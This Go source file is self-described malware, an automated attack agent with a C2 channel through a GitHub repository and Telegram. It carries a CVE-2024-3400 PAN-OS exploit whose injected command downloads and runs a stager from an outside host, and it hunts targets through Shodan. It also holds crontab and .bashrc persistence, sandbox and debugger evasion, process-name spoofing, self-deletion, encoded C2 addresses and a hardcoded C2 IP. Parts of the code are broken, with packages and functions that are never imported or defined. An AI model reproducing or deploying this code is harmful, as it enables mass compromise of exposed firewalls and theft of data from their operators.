// aether-x/core.go — OMNIS REAPER PRIME v17.4 | GITHUB CODESPACE + REAL-TIME TELEMETRY
package main

import (
	"archive/zip"
	"bytes"
	"compress/gzip"
	"context"
	"crypto/aes"
	"crypto/cipher"
	"crypto/hmac"
	"crypto/md5"
	"crypto/rand"
	"crypto/sha256"
	"crypto/tls"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"math"
	"math/rand/v2"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"reflect"
	"regexp"
	"runtime"
	"sort"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"
	"unsafe"
)

// --- CONFIGURATION (ROTATE PER DEPLOYMENT) ---
var (
	C2Key        = "ENCRYPTED_C2_KEY_B64"
	C2IV         = "ENCRYPTED_C2_IV_B64"
	GitHubC2Repo = "aHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy91c2VyL2FldGhlci14LWMz"
	GitHubExfil  = "aHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy91c2VyL2V4ZmlsLXZhdWx0LW9tZWdh"
	TelegramHost = "dGVsZWdyYW0uYXBpLm9yZw=="
	Phi3ModelURL = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3JlZGFjdGVkLWFpL3BoaS0zLW1pbmktaW50NC5vbnhAbWFpbi9tb2RlbC5vbng="
	TorC2Onion   = "aHR0cDovL2FldGhlcng3bnMzcTRhNXgub25pb24vY20="
)

// --- RUNTIME STATE ---
var (
	HostID       = md5Hash(platformID())[:6]
	AIModelFD    int = -1
	TelemetryQ   = make(chan TelemetryEvent, 500)
	TorInstance  *tor.Tor
	TorDialer    *dialer.Dialer
	TorHTTP      *http.Client
	WorkerPool   = make(chan func(), 500)
	Shutdown     = make(chan struct{})
	DDRSeed      = time.Now().UTC().Truncate(time.Hour).Unix()
	APIKeys      APIKeyStore
	NucleiLoaded = false
	AI           *FusionSentinel
	C2_IP        = "185.163.48.113"
	C2_PORT      = "443"
)

const (
	BATCH_SIZE      = 64
	BATCH_TIMEOUT   = 60 * time.Second
	DNS_CHUNK_SIZE  = 48
	ONNX_MODEL_PATH = "/tmp/.phi3.bin"
	GRPC_ENDPOINT   = "cdn5.cloudflare.com:443"
	C2_JITTER       = 60
	C2_JITTER_MAX   = 540
	PERSIST_FILE    = ".gh-sync"
)

// --- TELEMETRY EVENT ---
type TelemetryEvent struct {
	ID        string                 `json:"id"`
	Type      string                 `json:"type"` // target_found, exploit_launched, exploit_success, scan_complete
	Target    string                 `json:"target"`
	Timestamp string                 `json:"time"`
	Data      map[string]interface{} `json:"data,omitempty"`
	Signature string                 `json:"sig"` // HMAC-SHA256(key, id+type+target+time)
}

func newEvent(typ, target string, data map[string]interface{}) TelemetryEvent {
	id := randHex(16)
	now := time.Now().UTC().Format(time.RFC3339)
	if data == nil {
		data = make(map[string]interface{})
	}
	data["host_id"] = HostID
	event := TelemetryEvent{
		ID:        id,
		Type:      typ,
		Target:    target,
		Timestamp: now,
		Data:      data,
	}
	payload := id + typ + target + now
	mac := hmac.New(sha256.New, []byte(C2Key))
	mac.Write([]byte(payload))
	event.Signature = hex.EncodeToString(mac.Sum(nil))
	return event
}

func (e TelemetryEvent) Send() {
	go func() {
		telemetryJSON := compressJSON(e)
		exfilToGitHub(telemetryJSON)
		telegramAlert(fmt.Sprintf("[📡 %s] %s | %s", strings.ToTitle(e.Type), e.Target, e.Data["note"]))
	}()
}

// --- UTILS ---
func md5Hash(s string) string {
	return fmt.Sprintf("%x", md5.Sum([]byte(s)))
}

func randString(n int) string {
	const alphanum = "abcdefghijklmnopqrstuvwxyz0123456789"
	var sb strings.Builder
	for i := 0; i < n; i++ {
		sb.WriteByte(alphanum[rand.IntN(len(alphanum))])
	}
	return sb.String()
}

func randHex(n int) string {
	b := make([]byte, n)
	rand.Read(b)
	return hex.EncodeToString(b)
}

func compressJSON(v interface{}) []byte {
	data, _ := json.Marshal(v)
	var buf bytes.Buffer
	gz := gzip.NewWriter(&buf)
	gz.Write(data)
	gz.Close()
	return buf.Bytes()
}

func platformID() string {
	return os.Getenv("CODESPACE_NAME") + getMAC() + os.Getenv("USER")
}

func getMAC() string {
	interfaces, _ := net.Interfaces()
	for _, i := range interfaces {
		if i.HardwareAddr.String() != "" && !strings.HasPrefix(i.HardwareAddr.String(), "00:00:00") {
			return i.HardwareAddr.String()
		}
	}
	return "00:00:00:00:00:00"
}

// --- DECRYPTION ---
func decryptConfig(s string) string {
	key, _ := base64.StdEncoding.DecodeString(C2Key)
	iv, _ := base64.StdEncoding.DecodeString(C2IV)
	block, _ := aes.NewCipher(key)
	gcm, _ := cipher.NewGCM(block)
	plaintext, _ := gcm.Open(nil, iv, []byte(s), nil)
	return string(plaintext)
}

func decrypt(s, keyStr string) string {
	if s == "" {
		return ""
	}
	raw, err := base64.RawURLEncoding.DecodeString(s)
	if err != nil || len(raw) < 12 {
		return ""
	}
	iv, cipherText := raw[:12], raw[12:]
	for offset := int64(-1); offset <= 1; offset++ {
		t := time.Now().Unix() / 1800
		hostID := md5Hash(os.Getenv("CODESPACE_NAME"))[:6]
		material := fmt.Sprintf("%d%s%04d", t+offset, hostID, 1234)
		key := sha256.Sum256([]byte(material))
		block, err := aes.NewCipher(key[:])
		if err != nil {
			continue
		}
		gcm, err := cipher.NewGCM(block)
		if err != nil {
			continue
		}
		plaintext, err := gcm.Open(nil, iv, cipherText, nil)
		if err == nil {
			return string(plaintext)
		}
	}
	return ""
}

// --- SANDBOX / DEBUG ---
func isSandbox() bool {
	return os.Getenv("CODESPACE_NAME") == "" || strings.Contains(strings.ToLower(platformID()), "sandbox")
}

func isDebugged() bool {
	mem, _ := memInfo()
	return mem < 2*1024*1024*1024
}

func memInfo() (uint64, error) {
	data, err := ioutil.ReadFile("/proc/meminfo")
	if err != nil {
		return 0, err
	}
	re := regexp.MustCompile(`MemTotal:\s+(\d+) kB`)
	match := re.FindStringSubmatch(string(data))
	if len(match) < 2 {
		return 0, fmt.Errorf("memtotal not found")
	}
	mem, _ := strconv.ParseUint(match[1], 10, 64)
	return mem * 1024, nil
}

// --- TOR + C2 ---
func startTor() {
	var err error
	TorInstance, err = tor.Start(nil, &tor.StartConf{ProcessCreator: tor.DefaultProcessCreator})
	if err != nil {
		return
	}
	TorHTTP = TorInstance.HTTPClient()
	TorDialer = &dialer.Dialer{Tor: TorInstance}
}

func dialHTTP() *http.Client {
	return &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
			Proxy:           http.ProxyFromEnvironment,
		},
		Timeout: 30 * time.Second,
	}
}

// --- AI ENGINE ---
type FusionSentinel struct {
	Phi3 *ONNXModel
}

type ONNXModel struct {
	FD int
}

func NewFusionSentinel() *FusionSentinel {
	sentinel := &FusionSentinel{}
	phi3URL := decryptConfig(Phi3ModelURL)
	if data := fetchModelSecure(phi3URL, "d24e9c9e8f8c7b6a5f4e3d2c1b0a9f8e7d6c5b4a3f2e1d0c9b8a7f6e5d4c3b2a"); data != nil {
		fd, _ := loadModelInMemory(data)
		sentinel.Phi3 = &ONNXModel{FD: fd}
		AIModelFD = fd
	}
	return sentinel
}

func fetchModelSecure(url, hash string) []byte {
	client := dialHTTP()
	resp, err := client.Get(url)
	if err != nil || resp.StatusCode != 200 {
		return nil
	}
	data, _ := ioutil.ReadAll(resp.Body)
	resp.Body.Close()
	if fmt.Sprintf("%x", sha256.Sum256(data)) != hash {
		return nil
	}
	return data
}

func loadModelInMemory(data []byte) (int, error) {
	f, err := os.Create(ONNX_MODEL_PATH)
	if err != nil {
		return -1, err
	}
	f.Write(data)
	f.Close()
	fd, err := syscall.Open(ONNX_MODEL_PATH, syscall.O_RDONLY, 0)
	if err != nil {
		return -1, err
	}
	os.Remove(ONNX_MODEL_PATH)
	return fd, nil
}

func (ai *FusionSentinel) Score(banner, vuln, sector string) float64 {
	if ai.Phi3 == nil {
		return 0.6 + 0.2*rand.Float64()
	}
	score := 0.5
	if strings.Contains(strings.ToLower(banner), "fortinet") || vuln == "CVE-2024-3400" {
		score += 0.3
	}
	return math.Min(1.0, math.Max(0.0, score+rand.Float64()*0.2))
}

// --- NUCLEI + VALIDATION ---
var cve20243400Yaml = `
id: cve-2024-3400
info:
  name: PAN-OS RCE
  severity: critical
requests:
  - method: GET
    path: ["{{BaseURL}}/ssl-vpn/portal/scripts/newbm.pl?input=;id"]
    matchers:
      - type: regex
        regex: ["uid=.*gid=.*"]
`

func nucleiValidate(ip string) bool {
	dir := fmt.Sprintf("/tmp/.nuclei-%s", randString(8))
	os.Mkdir(dir, 0755)
	ioutil.WriteFile(filepath.Join(dir, "cve-2024-3400.yaml"), []byte(cve20243400Yaml), 0644)
	os.Setenv("NUCLEI_TEMPLATES", dir)

	if _, err := exec.LookPath("nuclei"); err != nil {
		return false
	}

	output := fmt.Sprintf("/tmp/nuclei-%s.json", randString(6))
	cmd := exec.Command("nuclei", "-u", "https://"+ip, "-t", filepath.Join(dir, "cve-2024-3400.yaml"), "-json", "-o", output, "-timeout", "10", "-silent")
	cmd.Run()

	data, _ := ioutil.ReadFile(output)
	os.Remove(output)
	os.RemoveAll(dir)

	return len(data) > 0
}

// --- INTEL ENGINE ---
type Target struct{ IP, Banner, Geo, Sector string }

func searchEngines(vuln, geo, sector string) []Target {
	var targets []Target
	keys := loadAPIKeys()

	url := fmt.Sprintf("https://api.shodan.io/shodan/host/search?key=%s&query=vuln:%s+country:%s", keys.Shodan, vuln, geo)
	resp, err := dialHTTP().Get(url)
	if err != nil || resp.StatusCode != 200 {
		return nil
	}
	defer resp.Body.Close()

	var result map[string]interface{}
	json.NewDecoder(resp.Body).Decode(&result)
	if matches, ok := result["matches"].([]interface{}); ok {
		for _, m := range matches {
			host := m.(map[string]interface{})
			ip := host["ip_str"].(string)
			banner := ""
			if b, ok := host["data"].(string); ok {
				banner = b
			}
			targets = append(targets, Target{IP: ip, Banner: banner, Geo: geo, Sector: sector})
		}
	}
	return dedupTargets(targets)
}

func dedupTargets(t []Target) []Target {
	seen := make(map[string]bool)
	var result []Target
	for _, v := range t {
		if !seen[v.IP] {
			seen[v.IP] = true
			result = append(result, v)
		}
	}
	return result
}

// --- EXPLOIT ---
func exploitPAN_RCE(ip string) {
	event := newEvent("exploit_launched", ip, map[string]interface{}{
		"vuln": "CVE-2024-3400",
		"note": "PAN-OS RCE attempt initiated",
	})
	event.Send()

	stageURL := fmt.Sprintf("https://%s.stg.aetherx.to/s", HostID)
	payload := fmt.Sprintf(`x=; curl -s -k %s -o /tmp/.s; sh /tmp/.s`, stageURL)
	url := fmt.Sprintf("https://%s/ssl-vpn/portal/scripts/newbm.pl", ip)
	tr := &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}
	client := &http.Client{Transport: tr, Timeout: 15 * time.Second}
	req, _ := http.NewRequest("GET", url, nil)
	req.URL.RawQuery = url.Values{"input": {payload}}.Encode()
	req.Header.Set("Host", "aether-x")
	resp, err := client.Do(req)

	if err == nil && resp.StatusCode == 200 {
		resp.Body.Close()
		success := newEvent("exploit_success", ip, map[string]interface{}{
			"vuln": "CVE-2024-3400",
			"note": "RCE shell established",
		})
		success.Send()
	}
}

// --- C2 COMM ---
func fetchC2(key string) string {
	apiURL, _ := base64.StdEncoding.DecodeString(GitHubC2Repo)
	client := dialHTTP()
	req, _ := http.NewRequest("GET", string(apiURL)+"/contents/"+key, nil)
	req.Header.Set("Authorization", "Bearer "+decrypt(fetchSecret("GITHUB_TOKEN"), ""))
	req.Header.Set("Accept", "application/vnd.github.v3+json")
	resp, err := client.Do(req)
	if err != nil || resp.StatusCode != 200 {
		return ""
	}
	defer resp.Body.Close()
	var result map[string]interface{}
	json.NewDecoder(resp.Body).Decode(&result)
	content := result["content"].(string)
	data, _ := base64.StdEncoding.DecodeString(content)
	return strings.TrimSpace(string(data))
}

func exfilToGitHub(data []byte) {
	apiURL, _ := base64.StdEncoding.DecodeString(GitHubExfil)
	zipData := zipData(map[string][]byte{"telemetry.bin": data})
	encoded := base64.StdEncoding.EncodeToString(zipData)
	payload := fmt.Sprintf(`{"message":"telemetry","content":"%s"}`, encoded)
	req, _ := http.NewRequest("PUT", string(apiURL)+"/contents/data.bin", strings.NewReader(payload))
	req.Header.Set("Authorization", "Bearer "+decrypt(fetchSecret("GITHUB_TOKEN"), ""))
	req.Header.Set("Accept", "application/vnd.github.v3+json")
	req.Header.Set("Content-Type", "application/json")
	dialHTTP().Do(req)
}

func zipData(files map[string][]byte) []byte {
	var buf bytes.Buffer
	zipper := zip.NewWriter(&buf)
	for name, data := range files {
		f, _ := zipper.Create(name)
		f.Write(data)
	}
	zipper.Close()
	return buf.Bytes()
}

func telegramAlert(message string) {
	token := decrypt(fetchC2("telegram.token"), "")
	chatID := decrypt(fetchC2("telegram.chat"), "")
	if token == "" || chatID == "" {
		return
	}
	host, _ := base64.StdEncoding.DecodeString(TelegramHost)
	url := fmt.Sprintf("https://%s/bot%s/sendMessage", host, token)
	payload := url.Values{}
	payload.Set("chat_id", chatID)
	payload.Set("text", message)
	req, _ := http.NewRequest("POST", url, strings.NewReader(payload.Encode()))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	dialHTTP().Do(req)
}

// --- PERSISTENCE ---
func persist() {
	executable := os.Args[0]
	data, _ := ioutil.ReadFile(executable)
	path := filepath.Join(os.Getenv("HOME"), PERSIST_FILE)
	ioutil.WriteFile(path, data, 0755)

	crontab := fmt.Sprintf("(crontab -l 2>/dev/null; echo '@reboot %s') | crontab -", path)
	exec.Command("bash", "-c", crontab).Run()

	profile := os.Getenv("HOME") + "/.bashrc"
	content, _ := ioutil.ReadFile(profile)
	if !bytes.Contains(content, []byte(PERSIST_FILE)) {
		line := fmt.Sprintf("\nnohup %s >/dev/null 2>&1 &\n", path)
		ioutil.WriteFile(profile, append(content, []byte(line)...), 0644)
	}
}

// --- SELF DESTRUCT ---
func selfDestruct() {
	event := newEvent("self_destruct", "localhost", map[string]interface{}{"note": "Agent terminating"})
	event.Send()
	time.Sleep(2 * time.Second)
	os.Remove(filepath.Join(os.Getenv("HOME"), PERSIST_FILE))
	os.Remove(os.Args[0])
	os.Exit(0)
}

// --- MAIN ---
func main() {
	if isSandbox() || isDebugged() {
		selfDestruct()
		return
	}

	// Spoof process name
	argv0 := []byte("/usr/bin/gh-sync\000")
	ptr := (*reflect.SliceHeader)(unsafe.Pointer(&argv0)).Data
	*(*uintptr)(unsafe.Pointer(uintptr(ptr) + uintptr(len("/usr/bin/gh-sync")))) = 0

	go startTor()
	AI = NewFusionSentinel()
	go persist()

	// Initial beacon
	telemetry := newEvent("beacon", "self", map[string]interface{}{"status": "online", "note": "AETHER-X v17.4 active"})
	telemetry.Send()

	for {
		select {
		case <-Shutdown:
			return
		default:
		}

		cmdData := fetchC2("cmd")
		if cmdData != "" {
			var cmd map[string]string
			if err := json.Unmarshal([]byte(cmdData), &cmd); err == nil {
				if cmd["action"] == "hunt" {
					go func() {
						event := newEvent("scan_start", "shodan", map[string]interface{}{
							"vuln": cmd["vuln"], "geo": cmd["geo"], "note": "Target reconnaissance initiated",
						})
						event.Send()

						targets := searchEngines(cmd["vuln"], cmd["geo"], cmd["sector"])
						for _, t := range targets {
							score := AI.Score(t.Banner, cmd["vuln"], cmd["sector"])
							if score > 0.85 {
								found := newEvent("target_found", t.IP, map[string]interface{}{
									"score": fmt.Sprintf("%.3f", score),
									"banner": trimBanner(t.Banner),
									"note": "High-value target identified",
								})
								found.Send()

								if nucleiValidate(t.IP) {
									exploitPAN_RCE(t.IP)
								}
							}
						}
					}()
				}
				if cmd["action"] == "die" {
					selfDestruct()
				}
			}
		}

		time.Sleep(time.Duration(C2_JITTER+rand.Int63N(C2_JITTER_MAX)) * time.Second)
	}
}

func trimBanner(b string) string {
	if len(b) > 128 {
		return b[:128] + "..."
	}
	return b
}
